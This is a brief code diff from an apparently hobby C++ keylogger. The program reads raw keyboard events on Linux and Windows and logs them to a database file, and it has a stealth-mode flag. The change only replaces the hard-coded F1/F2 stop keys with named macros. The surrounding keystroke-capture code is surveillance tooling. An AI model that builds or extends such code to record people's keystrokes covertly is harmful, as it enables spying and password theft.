@@ -25,6 +25,9 @@ using namespace std;
 #define DB_FILENAME				"keylog.db"
 #define STEALTHMODE             false
 
+#define LINUX_ESCAPE            keylog::value_f1
+#define WINDOWS_ESCAPE          keylog::value_f2
+
 
 #if defined(__linux)
 #define LINUX_DEVICE_FILENAME	"/dev/input/event2"
@@ -95,7 +98,7 @@ int main()
             keylog::KeyRecord* keyRecord = new keylog_linux::KeyRecord(event);
             keydb.insert(keyRecord);
 
-            if(keyRecord->getValue() == keylog::value_f1)
+            if(keyRecord->getValue() == LINUX_ESCAPE)
             {
                 break;
             }
@@ -115,7 +118,7 @@ int main()
                 keylog::KeyRecord* keyRecord = new keylog_windows::KeyRecord((time_t) rawtime, keyValue);
                 keydb.insert(keyRecord);
 
-                if(keyRecord->getValue() == keylog::value_f2) {
+                if(keyRecord->getValue() == WINDOWS_ESCAPE) {
                     break;
                 }
 
